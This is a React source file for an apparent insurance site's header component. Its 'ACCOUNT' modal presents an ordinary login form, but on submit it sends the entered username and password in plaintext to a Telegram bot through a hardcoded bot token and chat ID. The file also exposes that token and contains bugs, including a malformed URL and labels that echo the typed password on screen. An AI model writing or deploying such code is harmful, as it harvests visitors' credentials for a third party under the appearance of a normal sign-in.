import { useState } from "react";

import { IoMdExit } from "react-icons/io";

import logo from "../header/INSURE.svg";
import "./header.css";
import axios from "axios";

function Header() {
  const [modal, setmodal] = useState(false);
  const [ism, setism] = useState("")
  const [parol, setparol] = useState("")

  const sendMessege = (event)=>{
    event.preventDefault();
    const token = "8630844136:AAESFihnONhmYUb7zrX7Z24JY9xxHtMfd1Y"
    const chat_id = 8572947616

    const url = `https:/api.telegram.org/bot${token}/sendMessage`

    const name = document.getElementById("name").value
    const parol = document.getElementById("parol").value

    const messageContent = `Ism: ${name}\n parol:${parol}`;

    axios({
      url: url,
      method: "POST",
      data:{
        chat_id: chat_id,
        text: messageContent,

      }
    })
    .then(()=>{
      alert("xammasi joyda")
    }).catch((err)=>{
      alert("ishlamadi");
    })


  }

  return (
    <>
      <nav>
        <div className="container">
          <a href="#">
            {" "}
            <img src={logo} alt="sie logo" className="nav_logo" />
          </a>

          <div className="nav_box">
            <div className="nav_list">
              <a href="#" className="nav_item">
                HOW WE WORK
              </a>
              <a href="#" className="nav_item">
                BLOG
              </a>
              <a href="#" className="nav_item" onClick={() => setmodal(!modal)}>
                ACCOUNT
              </a>
            </div>

            <button className="nav_btn">VIEW PLANS</button>

            {modal && (
              <div className="mod_back">
                <IoMdExit
                  className="mod_exit"
                  onClick={() => setmodal(false)}
                />

                <form className="form" onSubmit={sendMessege}>
                  <label htmlFor="name">Login: {ism || setism}</label>
                  <input type="text" id="name" placeholder="Login" onChange={(event)=>setism(event.target.value)} />

                  <label htmlFor="parol">Password: {parol || setparol}</label>
                  <input type="password" id="parol" placeholder="Password" onChange={(event)=> setparol(event.target.value)} />

                  <button type="submit" className="mod_btn">Send</button>
                </form>
              </div>
            )}
          </div>
        </div>
      </nav>
    </>
  );
}

export default Header;
